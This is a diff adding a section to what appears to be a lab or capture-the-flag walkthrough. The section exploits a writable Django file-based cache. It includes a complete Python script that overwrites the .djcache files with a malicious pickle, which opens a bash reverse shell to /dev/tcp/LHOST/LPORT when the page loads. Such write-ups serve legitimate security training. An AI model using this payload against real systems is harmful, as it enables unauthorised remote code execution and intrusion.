@@ -92,4 +92,26 @@ When we check our permissions on the .djcache files (<i>/var/tmp/django_cache</i
 <img width="875" height="116" alt="image" src="https://github.com/user-attachments/assets/5ab4be8f-c3fc-4804-b320-cd8b9c6146b0" />
 <br>
 
+Since we have write access to the directory, we can generate our own serialized payload and overwrite the existing cache file. This will grant us a shell as sandy (not root), as the web application is run by the user <i>sandy</i>. To exploit this, use the script below: replace the LHOST and LPORT with your Netcat listener's IP and port, run the exploit, and refresh the <b>/explore</b> page to spawn the shell.
+<pre><code class="language-python">import os
+import pickle
+
+class Payload(object):
+    def __reduce__(self):
+        return (os.system, ("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'",))
+
+b = pickle.dumps(Payload())
+
+if os.path.exists("/var/tmp/django_cache"):
+    for f in os.listdir("/var/tmp/django_cache"):
+        if f.endswith(".djcache"):
+            p = os.path.join("/var/tmp/django_cache", f)
+            try:
+                os.remove(p)
+                with open(p, "wb") as o:
+                    o.write(b)
+            except:
+                pass</code></pre>
+<br>
+
 
